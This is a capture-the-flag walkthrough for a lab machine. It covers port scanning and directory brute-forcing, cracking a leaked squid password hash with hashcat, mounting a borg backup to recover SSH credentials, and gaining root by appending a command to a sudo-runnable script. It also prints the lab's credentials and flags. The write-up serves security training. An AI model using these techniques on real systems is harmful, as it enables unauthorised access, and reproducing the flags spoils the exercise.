# Task 2 Compromise the System

Compromise the machine and read the user.txt and root.txt

### Scan the machine, how many ports are open?

`sudo nmap -sS -Pn -p- -T4 -vv 10.10.53.223`

```
Discovered open port 22/tcp on 10.10.53.223
Discovered open port 80/tcp on 10.10.53.223
```


Answer: `2`

### What service is running on port 22?

`sudo nmap -sS -Pn -p 22,80 -sC -sV  -T4 -vv 10.10.53.223`

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtLmojJ45opVBHg89gyhjnTTwgEf8lVKKbUfVwmfqYP9gU3fWZD05rB/4p/qSoPbsGWvDUlSTUYMDcxNqaADH/nk58URDIiFMEM6dTiMa0grcKC5u4NRxOCtZGHTrZfiYLQKQkBsbmjbb5qpcuhYo/tzhVXsrr592Uph4iiUx8zhgfYhqgtehMG+UhzQRjnOBQ6GZmI4NyLQtHq7jSeu7ykqS9KEdkgwbBlGnDrC7ke1I9352lBb7jlsL/amXt2uiRrBgsmz2AuF+ylGha97t6JkueMYHih4Pgn4X0WnwrcUOrY7q9bxB1jQx6laHrExPbz+7/Na9huvDkLFkr5Soh
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBB5OB3VYSlOPJbOwXHV/je/alwaaJ8qljr3iLnKKGkwC4+PtH7IhMCAC3vim719GDimVEEGdQPbxUF6eH2QZb20=
|   256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKlr5id6IfMeWb2ZC+LelPmOMm9S8ugHG2TtZ5HpFuZQ
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Answer: `ssh`

### What service is running on port 80?

Answer: `http`

### What is the user.txt flag?

Navigate to the website in a browser, apache default page.
No robots.txt

`gobuster dir --url 10.10.53.223 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 40`

We see an `/admin/` site
Navigate to that in a browser
There is an Admins tab, and we can download some Archves.

On the Admins tab, we see some details
```
############################################
############################################
[Yesterday at 4.32pm from Josh]
Are we all going to watch the football game at the weekend??
############################################
############################################
[Yesterday at 4.33pm from Adam]
Yeah Yeah mate absolutely hope they win!
############################################
############################################
[Yesterday at 4.35pm from Josh]
See you there then mate!
############################################
############################################
[Today at 5.45am from Alex]
Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier.
I decided to give up like i always do ahahaha sorry about that.
I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.
Might pass it over to the IT guys but in the meantime all the config files are laying about.
And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.
other than that im pretty sure my backup "music_archive" is safe just to confirm.
############################################
############################################
```

Potentially some usernames, Josh, Adam, Alex

The archive contains what looks to be a [borg backup](https://borgbackup.readthedocs.io/)

Additionally there is a `/etc/` site with a squid config and passwd file

Looking at the passwd file, and hashcat examples we can see it is `-m 1600`
`hashcat -a 0 -m 1600 hash.txt rockyou.txt`

The password is `squidward`

This does not let us into SSH unfortunately.

Looking at the archive, we can run
`borg list field/dev/final_archive` and it prompts for a passphrase
using `squidward` shows  a music_archive backup.

```shell
sudo mkdir /mnt/borg
sudo borg mount field/dev/final_archive /mnt/borg
```

Once in the /mnt/borg folder we see a home directory for alex
We have a rabbit hole on the Desktop, however in the Documents folder we see what might be a password `alex:S3cretP@s3`

Connect via SSH with the credentials

`cat user.txt`

Answer: `flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}`

### What is the root.txt flag?

`sudo -l`
```
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

```
lex@ubuntu:/etc/mp3backups$ ls -la
total 24
drwxr-xr-x   2 root root  4096 Dec 30  2020 .
drwxr-xr-x 133 root root 12288 Dec 31  2020 ..
-rw-r--r--   1 root root     0 Oct 25 01:34 backed_up_files.txt
-r-xr-xr--   1 alex alex  1083 Dec 30  2020 backup.sh
-rw-r--r--   1 root root    45 Dec 31  2020 ubuntu-scheduled.tgz
```

We can see the file we have sudo permission to run, we are also the owner of.  So we can edit this file to grab the root flat

```shell
chmod +w backup.sh
echo "cat /root/root.txt" >> backup.sh
sudo ./backup.sh
```

Answer: `flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}`